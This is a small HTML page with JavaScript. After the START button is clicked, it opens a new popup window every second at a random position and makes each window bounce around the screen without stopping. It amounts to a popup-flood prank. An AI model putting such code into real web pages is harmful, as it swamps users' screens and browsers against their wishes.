<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Video Popup</title>
</head>
<body style="margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:black;">
  <button onclick="start()" style="font-size:24px;">START</button>

  <script>
    function start() {
      setInterval(openPopup, 1000);
    }

    function openPopup() {
      const w = 400, h = 300;
      const x = Math.random() * (screen.width - w);
      const y = Math.random() * (screen.height - h);

      const win = window.open(
        "popup.html",
        "",
        `width=${w},height=${h},left=${x},top=${y}`
      );

      if (!win) return;

      let dx = 25, dy = 25;

      const move = setInterval(() => {
        try {
          win.moveBy(dx, dy);

          const posX = win.screenX;
          const posY = win.screenY;

          if (posX <= 0 || posX + w >= screen.width) dx *= -1;
          if (posY <= 0 || posY + h >= screen.height) dy *= -1;
        } catch {
          clearInterval(move);
        }
      }, 30);
    }
  </script>
</body>
</html>
